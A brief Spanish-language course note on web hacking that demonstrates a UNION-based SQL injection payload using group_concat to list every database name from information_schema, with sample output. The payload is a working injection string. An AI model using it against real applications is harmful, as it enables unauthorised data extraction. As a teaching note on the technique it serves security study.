# Curso web s4vitar

## SQL

```
select id, username from users where id = '1' 
union select "test", group_concat(schema_name) from information_schema.schemata; -- '
```

### ¿Qué hace?

* Realiza **SQL Injection** usando `UNION` para combinar el resultado original con datos del sistema.
* La parte inyectada usa `group_concat(schema_name)` para obtener **todos los nombres de bases de datos** en una sola fila, separados por comas.

```
| id   | username                                              |
|------|-------------------------------------------------------|
| 1    | administrator                                         |
| test | information_schema,mysql,performance_schema,sys,login |
```

### ¿Por qué usar `group_concat` en vez de `LIMIT 0,1`?

* `LIMIT 0,1` solo devuelve una base de datos (una fila).
* `group_concat` concatena todas en un único resultado.
* Permite extraer toda la lista de bases de datos en **un solo paso**, de forma más eficiente.

